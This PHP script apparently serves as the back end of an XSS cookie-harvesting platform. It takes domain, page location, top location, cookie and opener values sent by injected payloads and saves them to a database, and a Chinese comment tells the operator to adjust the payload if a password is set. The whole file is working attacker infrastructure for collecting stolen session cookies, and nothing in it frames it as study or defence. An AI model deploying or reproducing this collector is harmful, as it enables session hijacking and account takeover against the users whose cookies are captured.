<?php
require_once ('config.php');
//注：如果设置了密码，请修改相应payload。
require_once('func.inc.php');
handlePwd($WRITE_PWD);
require_once ('db.php');

if (isset ( $_REQUEST ['domain'] ) && trim ( $_REQUEST ['domain'] ) != '') {
	$domain = $_REQUEST ['domain'];
	
	$location = $toplocation = $cookie = $opener = '';
	if(isset ( $_REQUEST ['location'] )){
		$location = urldecode ( $_REQUEST ['location'] );
	}
	if(isset ( $_REQUEST ['toplocation'] )){
		$toplocation = urldecode ( $_REQUEST ['toplocation'] );
	}
	if(isset ( $_REQUEST ['cookie'] )){
		$cookie = $_REQUEST ['cookie'];
	}
	if(isset( $_REQUEST ['opener'] ) ){
		$opener = $_REQUEST['opener'];
	}
	
	date_default_timezone_set ( 'Asia/Shanghai' );
	$time = date ( 'Y-m-d H:i:s' );
	
	$sql = "insert into $DB_TABLE_NAME (`time`,`domain`,`location`,`toplocation`,`cookie`,`opener`)
		values (:time, :domain, :location, :toplocation, :cookie, :opener)";
	$stmt = $DB->prepare($sql);
	$result = $stmt->execute([':time'=>$time,':domain'=>$domain,':location'=>$location,':toplocation'=>$toplocation,':cookie'=>$cookie,':opener'=>$opener]);
	//var_export($result);
}
?>